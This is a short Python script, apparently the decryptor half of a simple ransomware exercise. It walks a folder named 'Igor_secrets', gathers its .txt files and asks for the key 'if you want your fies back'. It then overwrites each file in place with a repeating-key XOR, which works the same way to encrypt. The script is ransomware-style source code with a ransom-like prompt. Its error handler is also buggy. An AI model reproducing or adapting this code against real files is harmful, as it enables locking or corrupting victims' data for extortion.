import os


def decrypt(file_to_encrypt, key):
    print(f'Decrypting {file_to_encrypt}')
    try:
        key_index = 0
        max_key_index = len(key) - 1
        with open(file_to_encrypt, 'rb') as f:
            data = f.read()
        with open(file_to_encrypt, 'w') as f:
            f.write('')
        for byte in data:
            xor_byte = byte ^ ord(key[key_index])
            with open(file_to_encrypt, 'ab') as f:
                f.write(xor_byte.to_bytes(1, 'little'))
            # Increment key index
            if key_index >= max_key_index:
                key_index = 0
            else:
                key_index += 1
        print(f'{file_to_encrypt} successfully decrypted!!!')
    except Exception as ex:
        print("Exception: " + ex)

#Grab filepaths to encrypt
print("Preparing files...")
abs_files = []
for root, dirs, files in os.walk("C:\\Igor_secrets"):
    for file in files:
        file_path, file_ext = os.path.splitext(root + "\\" + file)
        print("File path " + file_path + "File extension: " + file_ext)
        if file_ext == ".txt":
            abs_files.append(file_path+file_ext)
print("successfully allocated all the files!")

key = input("Please enter the decryption key, if you want your fies back: ")


for f in abs_files:
    decrypt(f, key)
